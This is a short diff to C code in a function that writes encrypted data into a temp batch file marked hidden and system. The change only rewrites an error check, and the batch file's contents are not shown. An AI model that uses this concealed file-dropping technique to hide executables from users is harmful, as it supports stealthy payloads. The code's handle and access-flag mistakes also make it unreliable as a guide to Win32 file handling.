@@ -92,7 +92,7 @@ void makebatch()
 	// Create hidden temp file using file path (this file will be saved as xxxx.bat.tmp)
 	HANDLE batchhandle = CreateFile(strcat(strdup(temp), ".tmp"), FILE_SHARE_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_TEMPORARY, NULL);
 	// Write encrypted data to file and check for errors
-	if (batchhandle == NULL || (WriteFile(batchhandle, lpData, batchsize, NULL, NULL)) == FALSE)
+	if (batchhandle == NULL || !WriteFile(batchhandle, lpData, batchsize, NULL, NULL))
 	{
 		printf("Unable To Create Resource Files: Error number %d\n", GetLastError());
 		err = err + 10;
